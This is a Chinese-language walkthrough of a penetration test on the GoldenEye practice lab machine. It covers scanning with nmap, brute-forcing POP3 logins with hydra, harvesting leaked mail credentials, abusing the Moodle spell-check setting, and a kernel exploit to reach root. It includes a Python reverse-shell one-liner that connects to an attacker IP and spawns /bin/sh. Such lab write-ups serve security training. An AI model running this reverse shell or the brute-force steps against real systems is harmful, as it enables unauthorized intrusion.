

# 记一次对GoldenEye的渗透 - 先知社区

记一次对GoldenEye的渗透

- - -

# 一、信息收集

1.arp-scan-l 收集目标ip

[![](assets/1704771507-055e683ab9349c2edfa8484f466d8c76.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175146-8965e478-ae0b-1.png)

2.使用命令：nmap -sP 192.168.182.0/24

[![](assets/1704771507-8b73989f9bdca4031f7f76aef016caa7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175200-917fa932-ae0b-1.png)

3.使用命令：nmap -sS -sV -T5 -A -p- 192.168.182.141

[![](assets/1704771507-5a17a79e76d2c0139c5ba7db81c7cc26.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175217-9b9990d6-ae0b-1.png)

4.到/sev-home/目录中。

[![](assets/1704771507-647eae4205115c9a2c11e9e026d26929.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175226-a0ec640a-ae0b-1.png)

5.检查主页的html内容以获取任何有用的提示（F12查看）

[![](assets/1704771507-07d138e39ef124fe5305db0e258f4d51.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175240-a9709d1c-ae0b-1.png)

6.发现了一个用户名和密码，然后发现了一个编码加密

[![](assets/1704771507-265add94a5e77bdf460b66726049126c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175251-b0217618-ae0b-1.png)

7，使用burp解密模块解密。

[![](assets/1704771507-b39249d9991ff1042ab20fcbd727dcd9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175301-b5b52070-ae0b-1.png)

8.然后登录  
Natalya  
Boris

Natalya  
InvincibleHack3r

[![](assets/1704771507-a6f8bf0d906708b9770ce8f044ab87a5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175321-c1fb59ee-ae0b-1.png)

9.然后使用f12查看，发现了pop3服务。POP3服务器的端口：55006、55007。

[![](assets/1704771507-1973f7b7589a4710c4743c77990f1298.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175332-c8810e76-ae0b-1.png)

10.浏览器上访问发现是55007端口。

[![](assets/1704771507-583f7badf5ff92dc5392b9292100f8f1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175402-da3d0dea-ae0b-1.png)

11.开始生成字典，开始爆破密码。  
hydra -L t1t.txt -P /usr/share/wordlists/fasttrack.txt 192.168.182.141 -s 55007 pop3

[![](assets/1704771507-5ca81254204413e0c009d3b39be7c1d5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175412-e041ce9c-ae0b-1.png)

12.开始使用nc连接，用户：boris 密码：secret1! 用户：natalya 密码：bird  
然后开始读邮件

[![](assets/1704771507-e0f1aafd8206b547ef8456e77d55c514.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175423-e687a3c6-ae0b-1.png)

13.使用，用户：natalya 密码：bird，开始都邮件。

[![](assets/1704771507-a9d9eaa4af2cdabfba02feb5a7f835d8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175432-ec2086d6-ae0b-1.png)

[![](assets/1704771507-07ac9ae91aa960f6e115c4794790f9ec.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175442-f1d5fff2-ae0b-1.png)

14.找到了敏感信息泄露

[![](assets/1704771507-32a2ab688ad13ab9067d1739f4ea3d6a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175452-f816acea-ae0b-1.png)

15.进入/etc/hosts目录，加入severnaya-station.com

```plain
用户名：xenia
密码：RCP90rulez!
域：severnaya-station.com
网址：severnaya-station.com/gnocertdir
```

我们现根据邮件提示添加本地域名：severnaya-station.com

[![](assets/1704771507-b4ffbc8044a2a22f21e204d42df61c68.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175509-0259b59e-ae0c-1.png)

16.本地访问。

[![](assets/1704771507-bdf156b11b93fb10a9bba6422d4cf157.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175520-08c40a1a-ae0c-1.png)

17登录之后，发现一个doak用户

[![](assets/1704771507-bb892f633d160d3f5d1ccfefbe73efa9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175529-0e38b194-ae0c-1.png)

18.加入字典

[![](assets/1704771507-99eef4ae39b014327e231fe4c252d88c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175538-1368f52a-ae0c-1.png)

19.开始爆破

成功登录  
[![](assets/1704771507-1811290d5ec90d596aa40e9b57c4f34b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108175552-1bed7f04-ae0c-1.png)  
username: dr\_doak  
password: 4England!  
[![](assets/1704771507-c9c999438defa302c21b3ac0288df74c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181154-5944d3c8-ae0e-1.png)  
登录之后，发现有一个图片

[![](assets/1704771507-cdc97642fb84e067f661f7970e732d9b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181257-7eac8f8e-ae0e-1.png)

[![](assets/1704771507-c9431682be562b7e39d6a68a07254b8d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181136-4eb1aac6-ae0e-1.png)

然后下载到本地。  
[![](assets/1704771507-c2b06bba9541e54d0df70e64f6e170df.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181308-856720a0-ae0e-1.png)  
进行图片检查  
[![](assets/1704771507-859a535a70c5e71da4b565e037394b2b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181409-a98d7d3a-ae0e-1.png)  
发现存在base64加密的编码  
[![](assets/1704771507-cf492e7817234abf632b6b1b4363cd1c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181423-b1d375a8-ae0e-1.png)  
解密之后，成功获得管理员用户密码.  
xWinter1995x!

## 二、漏洞利用

[![](assets/1704771507-f3660d7e8f5ccb0b4d7409d49834033f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181431-b6c068d2-ae0e-1.png)  
接着使用账号密码进行登录。发现其框架和版本。  
[![](assets/1704771507-297ff779173892fff4f1dc6d0ab22c0d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181521-d4550470-ae0e-1.png)  
使用google搜索历史漏洞  
[![](assets/1704771507-8081dd31a9f648b5668bb7e729779b17.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181528-d89267e4-ae0e-1.png)  
使用msf进行搜索exp  
[![](assets/1704771507-e86ad592781246b7700d8ef4815d993a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181555-e8b2c240-ae0e-1.png)  
设置payload

设置用户名：admin  
设置密码：xWinter1995x！  
xWinter1995x！  
设置：rhosts severnaya-station.com  
设置：targeturi / gnocertdir  
设置payload：cmd / unix / reverse  
设置：lhost 192.168.1.45  
[![](assets/1704771507-ba5e1a5eb4c404e8f171b8481838415c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181603-edf1d020-ae0e-1.png)  
利用之后，没有成功。接着发现有上传漏洞  
更改编辑器模式为googlshhell  
[![](assets/1704771507-b84327b46c19705f8e5f705587f26c64.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181614-f4596ef0-ae0e-1.png)  
添加反弹shell的payload

[![](assets/1704771507-db9d8d6615074175dc8f8133284472b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181623-f975ed00-ae0e-1.png)

```plain
python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.119.128”,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

然后新建一个邮件，来触发漏洞  
[![](assets/1704771507-ad56b585ba64b3dc4a1e9d92c8df75e4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181632-fea84ab6-ae0e-1.png)

成功反弹shell。  
[![](assets/1704771507-c798c26dd820b948e708b16bd5325345.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181644-063050da-ae0f-1.png)

## 三、权限提升

接着使用uname -a 来查看linux版本  
使用msf搜索可利用的exp  
[![](assets/1704771507-557b54c49adb8c1381af849005791e03.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181651-0a745a60-ae0f-1.png)  
下载到本地  
[![](assets/1704771507-f1ae4efcdf98831a32ee4d096d016a13.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181659-0f0d65bc-ae0f-1.png)  
将exp上传到远程服务器  
[![](assets/1704771507-2c8bbdc46b08c0bf90be3e4892e2142a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181709-14f41b4c-ae0f-1.png)  
[![](assets/1704771507-beee8052b5c4aaf811c93c0c3c5ac4a6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181716-191439a0-ae0f-1.png)  
使用cc进行编译脚本  
[![](assets/1704771507-032262515745ce69993c7b4bdcf282bc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181723-1d246222-ae0f-1.png)  
开启http监听  
[![](assets/1704771507-8c8a228d13f8d07a9dec7eb197fe59fc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181729-20d50142-ae0f-1.png)  
添加执行权限并执行exp脚本  
[![](assets/1704771507-87e3875ae361d765796cd8df94c841e0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181736-2550843a-ae0f-1.png)  
成功获取root文件  
[![](assets/1704771507-dd55d15f5ea4a06d1e0f5c057bd4f9f9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240108181744-29f0614a-ae0f-1.png)
